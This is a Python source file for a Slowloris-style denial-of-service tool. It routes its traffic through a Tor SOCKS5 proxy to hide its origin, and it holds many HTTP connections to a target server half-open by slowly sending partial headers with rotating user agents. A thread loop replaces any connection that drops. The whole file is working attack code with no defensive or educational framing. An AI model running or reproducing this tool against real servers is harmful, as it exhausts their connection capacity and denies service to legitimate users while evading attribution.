import logging
import random
import socket
import ssl
import sys
import threading
import time

try:
    from configs import *
except ImportError:
    print("Could not import configs! Using global configs instead.")


import socks

################################################## Global Configs ##################################################
THREADS = 1
SLEEP = 3
IP, PORT, HOSTNAME = '1.2.3.4', 80, 'example.com'


TOR_HOST, TOR_PORT = "localhost", 9050

ENCODING = 'utf-8'


logging.basicConfig(
    format="[%(asctime)s]  %(levelname)s - %(message)s", datefmt="%H:%M:%S", level=logging.INFO)
####################################################################################################################

# Setting the socket to use, tor service listening on port `TOR_PORT`, as proxy
# This is done by monkey patching socket.socket
socks.set_default_proxy(socks.SOCKS5, TOR_HOST, TOR_PORT)
socket.socket = socks.socksocket
# socket.setdefaulttimeout(4)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.32.186 Safari/537.36 OPR/50.23.55",
    "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML,like Gecko) Version/5.0.4 Safari/533",
    "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.0; Windows NT 6.0; Trident/5.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/61.57 (KHTML, like Gecko) Version/9.1 Safari/601.5.17",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.6 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.397.136 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.362.119 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 12371.75.2) AppleWebKit/53.6 (KHTML, like Gecko) Chrome/77.0.35.15 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:64.0) Gecko/20100101 Firefox/64.0",
    "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 95; PalmSource; Blazer 3.0) 16; 160x160"]

message_pointer = 0
message = """| |______________| |______________ |
| _____ |   | ___ | ___ ___ | |   | |
| |   | |_| |__ | |_| __|____ | | | |
| | | |_________|__ |______ |___|_| |
| |_|   | _______ |______ |   | ____|
| ___ | |____ | DuckYou | |_| |____ |
|___|_|____ | |   ___ |  |_______ | |
|   ________| | |__ | |______ | | | |
| | | ________| | __|____ | | | __| |
|_| |__ |   | __|__ | ____| | |_| __|
|  _____|_|_|_____| |___|___|___|__ |\r
\r\n"""


thread_limiter_semaphore = threading.BoundedSemaphore(THREADS)
active_connections = 0
Exit_Flag = False


def init_socket(threadNumber):
    """Initializes the SOCKET and sends http request.
    If everything was fine, sleeps for {SLEEP} number of seconds and tries to keep the connection in ESTABLISH state"""
    global message_pointer

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    if PORT == 443:
        s = ssl.wrap_socket(s)

    try:
        s.connect((IP, PORT))
        logging.info("Thread %d STARTED - Connection Established.", threadNumber)
    except socket.error as e:
        logging.info("Thread %d - Could not connect, Closing...")
        logging.debug("Thread %d - Error while trying to connect to (%d, %d) => %s", threadNumber, IP, PORT, e)
        return False

    s.send("GET / HTTP/1.1\r\n".encode(ENCODING))
    s.send("Host: {}\r\n".format(HOSTNAME).encode(ENCODING))
    s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode(ENCODING))
    s.send("Connection: keep-alive\r\n".encode(ENCODING))

    # s.send(f"Content-Length: {str(len(message) - 4)}\r\n".encode(ENCODING))

    # print(s.recv(2048).decode(ENCODING))

    # keeping alive
    while True:
        if Exit_Flag:
            logging.info("Thread %d Stopped", threadNumber)
            break
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode(ENCODING))
            # # s.connect_ex((IP, PORT))
            # len_to_send = 100
            # print(len_to_send)
            # upto = message_pointer + len_to_send
            # s.send(message[message_pointer:upto:].encode(ENCODING))
            #
            # print(message_pointer,", ", upto, message[message_pointer:upto:])
            # sent_m += message[message_pointer:upto]
            # message_pointer += len_to_send
            #
            # if message_pointer >= (len(message) - 4):
            #     s.send(message[message_pointer::].encode(ENCODING))
            #     logging.info("FULL: %d+%d =? %d",len(sent_m), len(message[message_pointer::]), len(message))
            #     message_pointer = 0

        except socket.error as e:
            logging.debug("Thread %d, Error in keeping the connection alive %s", threadNumber, e)
            logging.info("Thread %d CLOSED", threadNumber)
            break

        sleep_timer = random.randint(SLEEP, SLEEP + 5)
        logging.debug("Thread %d - Keep-alive SENT; sleeping for %ss", threadNumber, sleep_timer)
        time.sleep(sleep_timer)

    return False


class EncodeThread(threading.Thread):
    def __init__(self, threadNumber):
        threading.Thread.__init__(self)
        self.threadNumber = threadNumber

    def run(self):
        thread_limiter_semaphore.acquire()
        try:
            init_socket(self.threadNumber)
            # logging.debug("SMEAPHORRRRRRRRRRRRRRRRRRRRRRRRE %s", threadSemaphore.__str__())
        finally:
            thread_limiter_semaphore.release()


# def main2():
#     for i in range(THREADS):
#         thread = threading.Thread(target=init_socket, args=(i, ))
#         thread.start()

def threadMaker(threadNumber):
    thread = EncodeThread(threadNumber)
    thread.start()
    time.sleep(0.3)


def main():
    global Exit_Flag

    #
    for _ in range(THREADS):
        threadMaker(_)

    threadNumber = THREADS
    while True:
        logging.info("*****    Active Threads = %d    *****", threading.active_count() - 1)
        try:
            if threading.active_count()-1 < THREADS:
                threadNumber += 1
                threadMaker(threadNumber)
            else:  # if number of active threads was more than THREADS; sleep for some time and check again.
                time.sleep(2)
        except KeyboardInterrupt:
            print("SIGKILL Received, Safely stopping active threads...")
            Exit_Flag = True
            break

    sys.exit()


if __name__ == "__main__":
    main()
